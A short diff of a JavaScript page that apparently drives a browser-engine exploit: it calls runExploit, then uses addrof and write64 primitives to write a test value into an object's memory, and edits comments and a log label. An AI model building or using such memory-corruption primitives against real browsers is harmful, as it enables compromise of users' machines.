@@ -12,14 +12,10 @@ window.onload = async function() {
     try {
         await window.runExploit(log);
         log('Exploit complete!');
-        // Example usage of primitives:
-        // let addr = addrof({});
-        // let fake = fakeobj(addr);
-        // let val = read64(addr);
         var goofy = {};
         var emptyObjectAddr = addrof(goofy);
         write64(emptyObjectAddr, 0x41414141n);
-        log("[TEST] obj dat: " + goofy);
+        log("[MTEST] obj dat: " + goofy);
     } catch(e) {
         log('Exploit failed: ' + e);
     }
